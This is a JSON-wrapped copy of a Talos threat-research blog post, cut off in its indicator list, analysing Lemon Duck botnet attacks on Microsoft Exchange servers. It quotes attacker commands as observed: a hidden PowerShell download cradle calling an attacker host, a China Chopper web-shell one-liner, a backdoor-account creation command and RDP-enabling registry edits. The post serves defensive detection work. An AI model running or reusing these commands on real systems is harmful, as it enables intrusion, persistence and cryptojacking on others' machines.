{
    "id": "738a0f23-8a58-43e8-8c6e-4b79cfcbeb87",
    "created_at": "2023-01-12T14:59:26.354703Z",
    "updated_at": "2025-03-27T02:12:03.914047Z",
    "deleted_at": null,
    "sha1_hash": "d79037245caf29210a161fbc4fda3b32dc687861",
    "title": "2021-05-07 - Lemon Duck spreads its wings- Actors target Microsoft Exchange servers, incorporate new TTPs",
    "authors": "",
    "file_creation_date": "2022-05-28T02:47:42Z",
    "file_modification_date": "2022-05-28T02:47:42Z",
    "file_size": 785461,
    "plain_text": "# Lemon Duck spreads its wings: Actors target Microsoft Exchange servers, incorporate new TTPs\n\n**[blog.talosintelligence.com/2021/05/lemon-duck-spreads-wings.html](https://blog.talosintelligence.com/2021/05/lemon-duck-spreads-wings.html)**\n\nLemon Duck continues to refine and improve upon their tactics, techniques and\nprocedures as they attempt to maximize the effectiveness of their campaigns.\nLemon Duck remains relevant as the operators begin to target Microsoft Exchange\nservers, exploiting high-profile security vulnerabilities to drop web shells and carry out\nmalicious activities.\nLemon Duck continues to incorporate new tools, such as Cobalt Strike, into their\nmalware toolkit.\nAdditional obfuscation techniques are now being used to make the infrastructure\nassociated with these campaigns more difficult to identify and analyze.\nThe use of fake domains on East Asian top-level domains (TLDs) masks connections\nto the actual command and control (C2) infrastructure used in these campaigns.\n\n## Executive summary\n\nSince April 2021, Cisco Talos has observed updated infrastructure and new components\n[associated with the Lemon Duck cryptocurrency mining botnet that target unpatched](https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html)\n\n\n-----\n\nMicrosoft Exchange Servers and attempt to download and execute payloads for Cobalt\nStrike DNS beacons. This activity reflects updated tactics, techniques, and procedures\n(TTPs) associated with this threat actor. After several zero-day Microsoft Exchange Server\n[vulnerabilities were made public on March 2, Cisco Talos and several other security](https://blog.talosintelligence.com/2021/03/threat-advisory-hafnium-and-microsoft.html)\n[researchers began observing various threat actors, including Lemon Duck, leveraging these](https://blog.talosintelligence.com/2021/03/hafnium-update.html)\nvulnerabilities for initial exploitation before security patches were made available. Microsoft\n[released a report on March 25 highlighting Lemon Duck's targeting of Exchange Servers to](https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/)\ninstall cryptocurrency-mining malware and a malware loader that was used to deliver\nsecondary malware payloads, such as information stealers. We also discovered that Lemon\nDuck actors have been generating fake domains on East Asian top-level domains (TLDs) to\nmask connections to their legitimate C2 domain since at least February 2020, highlighting\nanother attempt to make their operations more effective. Below, we'll outline changes to the\nTTPs used by Lemon Duck across recent campaigns as they relate to various stages of\nthese attacks.\n\n## Recent campaigns and victimology\n\nCisco Talos researchers initially identified a notable increase in the volume of DNS queries\nbeing made for four newly observed Lemon Duck domains:\n\nt[.]hwqloan[.]com\nd[.]hwqloan[.]com\nt[.]ouler[.]cc\nps2[.]jusanrihua[.]com\n\nThis spike, which occured on April 9, 2021, coincided with infection activity collected within\nour telemetry systems associated with these same domains. We observed the largest spike\nin queries for ps2[.]jusanrihua[.]com, which peaked on April 13, then decreased before\nspiking again on April 26.\n\n_Spike in DNS queries to ps2[.]jusanrihua[.]com on April 9._\n\nLooking more closely at the geographic distribution of the domain resolution requests related\n\n\n-----\n\nto this activity, we observed that the majority of them originated from North America, followed\nby Europe, South East Asia, with a few others from South America and Africa. This is in\ncontrast to the query distribution observed in October 2020, as described in our previous\n[publication where the majority of the queries originated from Asia.](https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html)\n\n_Geographic distribution of queries for t[.]hwqloan[.]com as seen by Cisco Umbrella._\n\nNotably, for one of these domains, d[.]hwqloan[.]com, over sixty percent of the DNS queries\noriginated from India. We determined this activity was associated with infected systems\nattempting to communicate with Lemon Duck infrastructure. Since the communication with\nthese domains typically occurs during the Lemon Duck infection process, this activity may be\nindicative of the geographic distribution of the victims of these campaigns.\n\n[In Talos' original coverage of Lemon Duck, we described multiple overlaps between Lemon](https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html)\nDuck and another cryptocurrency-mining malware, Beapy (aka Pcastle), which had\npreviously been observed targeting East Asia. At the time, Lemon Duck infections reported\n[by other security researchers were beingobserved in much higher concentrations in China.](https://success.trendmicro.com/solution/000261916)\nWhile Lemon Duck's currently observed victimology and methods of propagation are largely\nindiscriminate, the seemingly exclusive use of country code TLDs (ccTLDs) for China, Japan\nand South Korea in the fake domains written to the Windows hosts file is notable, as\ndescribed in the section \"Command and control (C2)\" below.\n\nConsidering these ccTLDs are most commonly used for websites in their respective\ncountries and languages, it is also interesting that they were used, rather than more generic\nand globally used TLDs such as \".com\" or \".net.\" This may allow the threat actor to more\neffectively hide C2 communications among other web traffic present in victim environments.\nDue to the prevalence of domains using these ccTLDs, web traffic to the domains using the\nccTLDs may be more easily attributed as noise to victims within these countries. This may\n\n\n-----\n\nadd another potential overlap with Beapy, as each have exhibited TTPs suggesting possible\ntargeting of victims in East Asia. However, without additional evidence this particular\nconnection remains low confidence, although it is interesting within the context of the other\noverlaps between the two families.\n\n## Notable changes to Lemon Duck TTPs\n\nTalos has observed several recent changes to the tactics, techniques and procedures used\nby Lemon Duck. This demonstrates that this threat actor is continuously evolving their\napproach to maximize their ability to achieve their mission objectives. During our analysis of\nrecent Lemon Duck campaigns, we observed that the threat actor is now leveraging new\ninfrastructure, incorporating additional tools and functionality into their attack methodology\nand workflow, and putting more emphasis on obfuscating various components used\nthroughout the infection process in an attempt to more effectively evade detection and\nanalysis. Additionally, the threat actor is targeting high-profile software vulnerabilities that\nmay allow them to more effectively establish an initial foothold within victim environments.\nThe following sections will describe these changes throughout each phase of the attack\nlifecycle in more detail.\n\n### Delivery and initial exploitation\n\nLemon Duck features self-propagating capabilities and a modular framework that allow it to\nspread across network connections to infect additional systems that become part of the\nLemon Duck botnet and generate revenue for threat actors by mining cryptocurrency. This\nautomated exploitation of software vulnerabilities is one mechanism used by Lemon Duck to\nestablish initial access and propagate across a network environment. Lemon Duck operators\n[have previously employed several exploits for vulnerabilities, such as SMBGhost and](https://us-cert.cisa.gov/ncas/current-activity/2020/06/05/unpatched-microsoft-systems-vulnerable-cve-2020-0796) Eternal\nBlue, and appear to be implementing new exploit code and targeting additional software\nvulnerabilities over time to ensure that they can continue to spread malware to new hosts\nand maintain the size of the botnet and revenue stream being generated by compromised\nhosts.\n\n### Lemon Duck targets Microsoft Exchange\n\n[Talos assesses with medium confidence these are likely newer Lemon Duck components](https://blog.talosintelligence.com/2017/08/on-conveying-doubt.html)\nassociated with the targeting of Microsoft Exchange Server vulnerabilities. The vulnerabilities\nbeing targeted, which Microsoft has since issued patches for, are [CVE-2021-26855,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) CVE2021-26857, [CVE-2021-26858 and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858) [CVE-2021-27065. These vulnerabilities were reported on](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065)\nMarch 2, 2021 and affect Microsoft Exchange Server versions 2013, 2016 and 2019. They\n[have been leveraged by multiple threat actors targeting Microsoft Exchange servers around](https://blog.talosintelligence.com/2021/03/hafnium-update.html)\nthe world\n\n\n-----\n\nWhile we could not determine the exact exploitation vector used in this campaign, the actors\nappear to be targeting unpatched Exchange Servers, dropping web shells and employing\n[several techniques that are consistent with previousreporting on post-compromise activity](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)\nleveraging these vulnerabilities, as discussed in the section \"Post-Compromise Activities on\nExchange Servers\" below.\n\n### Typical post-compromise activities\n\nOnce a new system has been compromised by Lemon Duck, the subsequent infection\nprocess features several notable characteristics. In many cases, compromised systems\nattempt to retrieve additional components and modules from attacker-controlled web servers.\nWe observed typical Lemon Duck download attempts in telemetry data for files such as\n\"ipc.jsp\" and \"aa.jsp\" on endpoints. This activity was associated with previously reported\nLemon Duck domains, such as t[.]netcatkit[.]com and t[.]bb3u9[.]com.\n\nThese files contain PowerShell instructions that are executed by the system and are\nresponsible for reporting successful infections and collecting system information from the\nvictim machine, such as computer name, GUID and MAC address, which is then transmitted\nback to the attacker.\n```\nc:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe & powershell -w hidden\nIEX(New-Object Net.WebClient).DownLoadString('http://t.bb3u9.com/7p.php?\n1.0*ipc*SYSTEM*<MACHINE_NAME>*+[Environment]::OSVersion.version.Major);bpu\n('http://t.bb3u9.com/ipc.jsp?1.0')\n\n```\nAfter the initial beaconing and system information gathering, a base64-encoded Portable\nExecutable (PE) file\n(6be5847c5b80be8858e1ff0ece401851886428b1f22444212250133d49b5ee30) was\nretrieved from the following URL:\n\nhxxp[:]//t[.]hwqloan[.]com/t.txt\n\nOnce decoded, the PE executed multiple commands using the Windows Management\nInstrumentation (WMI) command \"wmic.exe\" to uninstall AV/security products, such as ESET\nand Kaspersky. It also stopped and removed various security-related services, such as the\nWindows Update feature, wuauserv, and Windows Defender. Some examples of this removal\nactivity can be seen in the screenshot below.\n\n_WMIC removing AV products._\n\n\n-----\n\nWhile analyzing the PE, we observed the execution of a PowerShell script that downloaded\nand executed an additional malware payload, \"syspstem.dat\", from\nhxxp[:]//d[.]hwqloan[.]com, a newly observed subdomain for hwqloan[.]com. This payload\nwas a Python executable file and likely related to the Python-based module described in our\n[previous publication. It includes the \"killer\" module which contains a hardcoded list of service](https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html)\nnames that Lemon Duck uses to disable competing cryptocurrency miners. Once\ndownloaded, it is saved to the AppData\\Local\\Temp\\ directory, where a subsequent\nPowerShell script checks to determine if the MD5 hash value of the file matches a hardcoded value. Assuming the check passes, it then creates a scheduled task called \"syspstem\"\nand configures it to execute it every 50 minutes, as seen below.\n\n_\"syspstem\" scheduled task creation._\n\nThe PE file then makes an HTTP GET request to download a remote resource from\nhxxp[:]//ps2[.]jusanrihua[.]com/ps, which, at the time of analysis, appeared to be down and/or\nunavailable resulting in download failure.\n\nConsistent with previous Lemon Duck campaigns, we observed the use of native Windows\n[command-line utilities and living-off-the-land binaries or \"LoLBins\" to carry out various tasks](https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html)\nthroughout the infection process. Several scheduled tasks were also created for various\npurposes including achieving persistence across system reboots.\n\nIn more recent campaigns, we have observed several notable changes to the infection\nprocess. The threat actor is now leveraging CertUtil to download and execute two new\nmalicious PowerShell scripts, \"dns\" and \"shell.txt\" which are retrieved from an attackercontrolled web server (hxxp[:]//t[.]hwqloan[.]com), and saved as \"dn.ps1\" and \"c.ps1,\"\nrespectively.\n\nThe PowerShell script \"dn.ps1\" attempts to uninstall multiple AV products, similar to what\nwas previously described and configures a scheduled task that will execute a subsequent\nPowerShell script. It also establishes persistence routines that attempt to download and\nexecute content retrieved from each of the following URLs:\n\nhxxp[:]//t[.]hwqloan[.]com/dns\nhxxp[:]//t[.]ouler[.]cc/dns\n\n\n-----\n\nhxxp[:]//ps2[.]jusanrihua[.]com/dns\n\nMost notably, the URL hxxp[:]//ps2[.]jusanrihua[.]com/dns is used to retrieve a Cobalt Strike\npayload. This is a new evolution in Lemon Duck's toolset. For details related to the Cobalt\nStrike payload and how it is being leveraged in Lemon Duck campaigns, refer to the section\n\"Command and Control (C2).\"\n\nThe PowerShell script \"c.ps1\" contains several CertUtil commands that are used to\ndownload additional payloads, such as a variant of the XMRig cryptocurrency miner\n\"m6.exe,\" which Lemon Duck's used in the past. This activity is also consistent with activity\n[that was previously reported here.](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)\n\nBased on analysis of system activities associated with these campaigns, additional postcompromise discovery and targeting activities may be conducted as described in the section\n\"Exchange Server Reconnaissance and Discovery.\" Following execution of the\ncryptocurrency mining payload, the PowerShell script is responsible for cleaning up various\nartifacts and removing indicators of compromise, such as the aforementioned \"dn.ps1\" and\n\"c.ps1\" from the infected system.\n\nThe \"netsh.exe\" Windows command is also used to disable Windows Firewall settings,\nenable port forwarding, and redirect traffic to 1[.]1[.]1[.]1[:]53 from port 65529/TCP. As\n[described in previous Lemon Duck reporting, the malware uses port 65529 as an indicator to](https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/)\nidentify if systems have already been compromised, and thus avoid reusing the exploitation\nmodules on them if it is not necessary.\n\n### Post-compromise activities targeting Exchange servers\n\nWhile analyzing telemetry related to ongoing Lemon Duck campaigns, we identified\nmalicious activity being conducted on endpoints whose host names indicated they may be\nmail servers running Microsoft Exchange. This elevated our level of confidence that they may\nhave been compromised by exploitation attempts targeting the previously described\nMicrosoft Exchange vulnerabilities, with variants of known web shells being uploaded\nfollowing successful system compromise. The following section describes malicious activity\nthat was detected on these systems that may indicate that the adversaries are now showing\nspecific interest in compromising Microsoft Exchange servers and leveraging them for\nnefarious purposes.\n\n**Exchange Server directory creation**\n\nWhile analyzing the malicious activity detected on compromised systems suspected to be\n\n\n-----\n\nExchange servers, we identified the execution of interesting system commands using the\nWindows Control Manager (sc.exe). This native Windows executable was used to set\ndescriptions for services, configure services, and start services on compromised systems. An\nexample of this can be seen below:\n\n_\"sc.exe\" used to configure, start services on compromised systems._\n\nInterestingly, the DisplayName used in this case contained the value \"Microsofts\" and\nappeared to be a reference to the \"Windows Defender Antivirus Network Inspection Service,\"\n[which according to this description of the service (WdNisSvc), \"helps guard against intrusion](http://revertservice.com/10/wdnissvc/)\nattempts targeting known and newly discovered vulnerabilities in network protocols.\"\n\nWe also observed the creation of various directories within the IIS web directory on infected\nsystems. An example of this can be seen below.\n```\nmd C:\\inetpub\\wwwroot\\aspnet_client\\js\\demo\n\n```\n[The creation and use of this directory structure is consistent with previous reporting on](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)\nvarious TTPs related to successful attacks against Exchange servers leveraging the\nvulnerabilities described earlier in the section \"Lemon Duck targets Microsoft Exchange.\"\n\nThe adversary also copied several files into it, including two .ASPX files named\n\"wanlins.aspx\" and \"wanlin.aspx.\" These files are likely web shells and were copied from\nC:\\inetpub\\wwwroot\\aspnet_client\\, a known directory where a majority of the web shells\n[were initially observed following Microsoft's release of details related to Hafnium activity. An](https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/)\nexample of this can be seen below.\n```\ncopy C:\\inetpub\\wwwroot\\aspnet_client\\wanlin.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\js\\demo\\wanlins.aspx\n\n```\nThis newly created directory appears to be the actor's working environment (\\js\\demo), and\nwas likely used by the actor to stage files early in the post-compromise phase of the attack.\n[In late March 2021, it was reported here that a file with the name \"wanlin.aspx\" was](https://blog.netlab.360.com/microsoft-exchange-vulnerability-cve-2021-26855-scan-analysis-3/)\nobserved as part of a large number of web shell probing requests that were believed to be\npart of scanning activity conducted by security vendors and research organizations. These\n[same file names were also identified by security researchers as being associated with](https://twitter.com/GossiTheDog/status/1379769243298844673)\n[various web shells that were identified nearly a month after Microsoft's initial publication](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\nrelated to threat actors' exploitation of these Exchange vulnerabilities by threat actors.\n\nThe Windows \"attrib\" command was also used to set the Archive file attribute, System file\nattribute, Read-only attribute, and the Hidden file attribute on the previously created files and\ndirectories, likely as a way to obfuscate the actor's activities on the system.\n\n\n-----\n\n_Modifying file attributes with the \"attrib\" command._\n\nNext, we observed the echo command being used to write code associated with a web shell\ninto the previously created ASPX files. In this case, several characteristics matched portions\n[of code associated with known China Chopper variants identified days after the Exchange](https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html)\nServer vulnerabilities were publicized. An example of this can be seen below.\n```\necho '<script language=\"JScript\" runat=\"server) function Page_Load()\n{/**/eval(Request[\"code\"],\"unsafe\");}</script>'\n>\"C:\\inetpub\\wwwroot\\aspnet_client\\js\\demo\\wanlins1.aspx\"}};sh\n\n```\nThe 'runat=server' [attribute causes the script to be processed server-side instead of client-](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525319(v%3Dvs.90))\nside, while JScript is specified as the language used for the script block. Researchers have\n[previously noted many variations in the](https://unit42.paloaltonetworks.com/china-chopper-webshell/) [China Chopper web shells dropped in attacks](https://blog.talosintelligence.com/2019/08/china-chopper-still-active-9-years-later.html)\nexploiting the Exchange vulnerabilities before security patches were issued. This further\nhighlights that we will likely continue to see a variety of TTPs associated with this activity as\nan increasing number of actors incorporate these CVEs into their attacks.\n\nAnother Lemon Duck sample within our telemetry data was detected during the same\ntimeframe and also attempted to create an additional Exchange-specific directory structure\non infected systems. This new directory was located at the following filesystem path:\n```\nE:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\js\\demo\n\n```\nWhile we did not observe .ASPX files copied into this directory location on the system where\nthis activity was detected, this clearly demonstrates specific interest in operating on and the\ntargeting of Microsoft Exchange servers by the threat actor.\n\n**Exchange Server reconnaissance and discovery**\n\n[We also observed post-compromise activities consistent with previous reporting on additional](https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/)\nreconnaissance and discovery conducted following successful exploitation of the Microsoft\nExchange vulnerabilities described earlier in this post.\n\nThe built in \"net\" and \"net1\" command-line utilities were used to create new user accounts\nwith local administrator privileges on systems and modify local group membership. We\nobserved the command \"net user\" being used to create a new user with the alias \"netcat\"\nand a designated password, followed by several attempts to invoke \"net localgroup\" to add\nthis newly created user to the following local security groups: administrators,\nAdministrateurs, Remote Desktop Users and Enterprise Admins.\n\n\n-----\n\n_\"net\" commands are used to add users and modify local groups._\n\nWe also observed \"net1\" commands with the following syntax:\n```\nC:\\Windows\\system32\\net1 user netcat qweqwe$123 /add\n\n```\nCreating a new user and adding it to local groups may be an attempt to obfuscate and/or\nminimize evidence of suspicious activities. One of these groups, Administrateurs may\nsuggest that a language preference was used to more broadly target additional systems in\norder to query and add groups on those systems.\n\nWMI commands were also leveraged to modify the registry and enable Remote Desktop\nProtocol (RDP) using the following syntax:\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections\n/t REG_DWORD /d 00000000 /f\" wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call\nSetAllowTSConnections 1\"\n\n```\nThis registry modification is consistent with post-exploitation activities previously reported by\n[Microsoft in their report related to successful exploitation campaigns against Exchange](https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/)\nServers leveraging the same Exchange vulnerabilities. At this point, a typical Lemon Deck\ninfection chain follows, similar to what was described earlier in the section \"Typical PostCompromise Activities.\"\n\nRecent Lemon Duck activity suggests that the operators are continuing to update portions of\ntheir attack to remain viable as they incorporate new TTPs and begin targeting new highprofile security vulnerabilities. Some examples of suspicious activities we observed\nthroughout recent Lemon Duck campaigns include the following:\n\nCreation of various Exchange-specific directory structures within the IIS web directory\non compromised systems.\nCopying of .ASPX files associated with these web shells into the recently created\nExchange-specific directory structure.\nPost-compromise activity including the creation of new users and modification of local\ngroup membership using the \"net\" and \"net1\" commands.\nModification of the Windows registry to enable RDP access to the system.\n\nAs the number of distinct threat groups incorporate these exploits into their attacks continues\nto increase, we're likely to see varying techniques associated with this activity. We\nrecommend checking for the aforementioned activity as potential evidence of compromise.\n\n\n-----\n\n### Command and control (C2)\n\n**Cobalt Strike DNS beacons**\n\n[Lemon Duck was also observed leveraging Cobalt Strike payloads during recent campaigns,](https://blog.talosintelligence.com/2020/09/coverage-strikes-back-cobalt-strike-paper.html)\nrepresenting an evolution in the toolset used by this threat actor and demonstrating that they\ncontinue to refine their approach to the attack lifecycle over time as they identify\nopportunities to increase their efficiency as well as the effectiveness of their attacks. While\nanalyzing Lemon Duck infection activity, we observed PowerShell being used to download\nand execute a Cobalt Strike payload that was retrieved from the following URL:\n\nhxxp[:]//ps2[.]jusanrihua[.]com/dns\n\nThis payload was configured as a Windows DNS beacon and attempts to communicate with\nthe C2 server (1f0834b2[.]ps2[.]jusanrihua[.]com) using a DNS-based covert channel. The\nbeacon then communicates with this specific subdomain to transmit encoded data via DNS A\nrecord query requests. An example of this activity can be seen in the screenshot below.\n\n_Wireshark showing DNS requests to 1f0834b2[.]ps2[.]jusanrihua[.]com._\n\nThis represents a new TTP for Lemon Duck, and is another example of their reliance on\noffensive security tools (OSTs), including Powersploit's reflective loader and a modified\n\n\n-----\n\nMimikatz, which are already included as additional modules and components of Lemon Duck\nand used throughout the typical attack lifecycle.\n\n**Decoy domain generation**\n\nAnother previously unreported TTP we have observed is Lemon Duck's use of a new\ntechnique to obfuscate their C2 domain(s). This technique appears to have been used by\nLemon Duck since at least February 2020, according to our telemetry data. During the\nLemon Duck infection process, PowerShell is used to invoke the \"GetHostAddresses\"\nmethod from the .NET runtime class \"Net.Dns\" to obtain the current IP address for an\nattacker-controlled domain. For example, during our analysis, we observed the following\ndomains being used for this purpose.\n\nt[.]awcna[.]com\nt[.]tr2q[.]com\nt[.]amxny[.]com\n\nThis IP address is combined with a fake hostname hardcoded into the PowerShell command\nand written as an entry to the Windows hosts file located at\n\nc:\\windows\\system32\\drivers\\etc\\hosts.\n\nThis mechanism allows name resolution to continue even if DNS-based security controls are\nlater deployed as the translation is now recorded locally and future resolution requests no\nlonger rely upon upstream infrastructure such as DNS servers. This may allow the adversary\nto achieve longer term persistence once operational in victim environments. The domain\ninformation written to the hosts file varied across each Lemon Duck infection we analyzed.\n\nThese values are stored as string literals within the intermediate PowerShell invocation.\nSince the PowerShell code itself does not generate these string values, they are likely\ngenerated within the initial Lemon Duck PE as the PowerShell script itself is constructed or\nmay be included statically within the files used for intermediate stage execution hosted on\nthe C2 servers. The decoy domain composition does not appear to be derived from\ndictionary words or combinations. Character case varies significantly, as does the use of\nnumerals interspersed with ASCII latin characters. There are also slight variations in length,\nalthough the generated domains in the samples we analyzed do not have a length greater\nthan ten alphanumeric characters, not including the top level domain (TLD). All of the TLDs\nused are East Asian country code TLDs including .cn, .kr and .jp. While this activity dates\nback almost a year, this particular technique has likely supported Lemon Duck's continued\npersistence throughout its lengthy campaign.\n\n## Other cryptocurrency-mining botnets targeting Exchange vulnerabilities\n\n\n-----\n\nTalos began to observe domains linked to Lemon Duck and another cryptocurrency miner,\nDLTMiner, as infrastructure used in post-exploitation activity that targeted the Microsoft\n[Exchange zero-days in early March 2021. Other security firms have also detailed the actions](https://www.bleepingcomputer.com/news/security/microsoft-exchange-exploits-now-used-by-cryptomining-malware/)\n[of DLTMiner. We also identified activity that was published very recently related to some of](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)\nthe components mentioned above (c.ps1, dns.ps1, m6.exe) that were observed on\ncompromised systems where ransomware was also deployed. At this time, there doesn't\nappear to be a link between the Lemon Duck components observed there and the reported\nransomware (TeslaRVNG2). This suggests that given the nature of the vulnerabilities\ntargeted, we are likely to continue to observe a range of malicious activities in parallel, using\nsimilar exploitation techniques and infection vectors to compromise systems. In some cases,\nattackers may take advantage of artifacts left in place from prior compromises, making\ndistinction more difficult.\n\n[Open-source research indicates that additional cryptocurrency mining malware variants have](https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/)\nbeen leveraging vulnerable Exchange Servers as an initial exploitation vector for their\noperations. For example, in late April 2021, another cryptocurrency mining botnet, Prometei,\nwas [reported to be exploiting two of the aforementioned Exchange Server vulnerabilities](https://www.cybereason.com/blog/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities)\n(CVE-2021-27065 and CVE-2021-26858) which allowed the attackers to achieve remote\ncode execution on the host. The attackers then installed and executed a variant of the China\nChopper web shell, among other custom and native Windows utilities. Due to the increasing\nnumber of actors incorporating these CVEs into their attacks, we will likely continue to see a\nvariety of TTPs associated with this activity going forward.\n\n## Conclusion\n\nLemon Duck continues to launch campaigns against systems around the world, attempting to\nleverage infected systems to mine cryptocurrency and generate revenue for the adversary\nbehind this botnet. The use of new tools like Cobalt Strike, as well as the implementation of\nadditional obfuscation techniques throughout the attack lifecycle, may enable them to\noperate more effectively for longer periods within victim environments. New TTPs consistent\nwith those reportedly related to widespread exploitation of high-profile Microsoft Exchange\nsoftware vulnerabilities, and additional host-based evidence suggest that this threat actor is\nalso now showing a specific interest in targeting Exchange Servers as they attempt to\ncompromise additional systems and maintain and/or increase the number of systems within\nthe Lemon Duck botnet. Organizations should remain vigilant against this threat, as it will\nlikely continue to evolve.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n\n-----\n\n[Cisco Secure Endpoint is ideally suited to prevent the execution of the malware detailed in](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[this post. New users can try Cisco Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\ndetects malware used in these attacks.\n\n[Cisco Secure Firewall and](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) [Meraki MX can detect malicious activity associated with this](https://meraki.cisco.com/products/appliances)\nthreat.\n\n[Cisco Secure Malware Analytics helps identify malicious binaries and build protection into all](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nCisco Security products.\n\n[Cisco Umbrella, our secure internet gateway (SIG), blocks users from connecting to](https://umbrella.cisco.com/)\nmalicious domains, IPs, and URLs, whether users are on or off the corporate network.\n\nAdditional protections with context to your specific environment and threat data are available\nfrom the [Cisco Secure Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.The following SIDs have been released](https://www.snort.org/products)\nto detect this threat: 45549:4, 46237, 50795, 55926, 57469 - 57474.\n\n\n-----\n\nThe following ClamAV signatures have been released to detect this threat as well as tools\nand malware related to these campaigns:\n\nPs1.Trojan.Lemonduck-9856143\nPs1.Trojan.Lemonduck-9856144\nWin.Trojan.CobaltStrike-7917400\nWin.Trojan.CobaltStrike-8091534\n\nThe following Cisco Secure Endpoint Cloud IOCs have been released to detect this threat on\nendpoints:\n\nW32.LemonDuckCryptoMiner.ioc\nClam.Ps1.Dropper.LemonDuck-9775016-1\nWin.Miner.LemonDuck.tii.Talos\nPs1.Dropper.LemonDuck\nClam.Js.Malware.LemonDuck-9775029-1\n\n## ATT&CK Technique Mapping\n\nThe following ATT&CK techniques have been observed across the Lemon Duck campaigns\ndescribed in this blog post.\n\n## Indicators of Compromise (IOCs)\n\nThe following indicators of compromise have been observed as being associated with these\nmalware campaigns.\n\n### Hashes\n\n\n-----\n\nThe following file hashes (SHA256) have been observed as being associated with these\nmalware campaigns.\n\n67d3986c97a8b8842c76130db300ff9cd49e6956c696f860413b7b4cf0f069ec smgh.jsp\nf3c25eefacda4e37d36fa61cdbd5b3ba0fcb89351db829c4d859f9bcb83551cd t.txt\nd811b21ac8ab643c1a1a213e52c548e6cb0bea51ca426b75a1f5739faff16cbd m6.exe\n4a49002c12281c2e45bcfc330f006611ce34791eda62cf4022a117ae29a57908 sysps.dat\n3e2f5f43ee0b5afbea8a65ae943c5d40ac66e7af43067312b29b7d05e8ea31f2 shell.txt\n0e116b0c88a727c5bfa761125ba08dfd772f0fac13ab16d7ac1a614ff7ec72ca shell.txt\nb3f8e579315a8639ae5389e81699f11c7a7797161568e609eb387fbfb623a519 dns\nedb4af3ad9083bbdd67f6fa742b1959da2bda28baadacfb7705216a9af5b61b0 dns\n9f2fb97fea297f146a714d579666a1b9efd611edd8c1484629e0a458481307e5 svchost.dat\nafc70220e3100e142477a2c4ea54f298a7a6474febc51ba581fc1e5c2da2f3f6 cc.ps1\nc3c786616d69c1268b6bb328e665ce1a5ecb79f6d2add819b14986f6d94031a1 mail.jsp\n6be5847c5b80be8858e1ff0ece401851886428b1f22444212250133d49b5ee30\n069547eebb24585455d6eece493eb46a8e045029cb97ace0a662394aebdbf7b7 m6g.bin.exe\n941da851c01806fa983e972cb6f603399fbd6608df9280a753f3d2ed0fedafb5 report.ps1\n7c3ba189cf35ec007237a28e9d0c3ddf5765d4f85cf0e27439ba36cc721e4cf8 kr.bin\ne8010a6942b70918ff01219128a005e13bcbc41b62e88261803cedf086738266 if.bin\n\n### URLs\n\nThe following URLs have been observed as being associated with these malware\ncampaigns.\n\nhxxp[:]//t[.]hwqloan[.]com/dns\n\nhxxp[:]//t[.]hwqloan[.]com/m6.exe\n\nhxxp[:]//t[.]hwqloan[.]com/svchost.dat\nhxxp[:]//t[.]hwqloan[.]com/shell.txt\n\nhxxp[:]//d[.]hwqloan[.]com/t.txt\n\nhxxp[:]//d[.]hwqloan[.]com/syspstem.dat\n\nhxxp[:]//t[.]ouler[.]cc/dns\n\nhxxp[:]//ps2[.]jusanrihua[.]com/dns\n\nhxxp[:]//ps2[.]jusanrihua[.]com:80/ps\n\n### Domains:\n\nThe following domains have been observed in the activity discussed above.\n\naeon-pool.sqlnetcat[.]com\n\napis.890[.]la\n\nwakuang.eatuo[.]com\n\n\n-----\n\nThe following domains have been observed as being generated using the Domain\nGeneration Algorithm (DGA) described in this blog 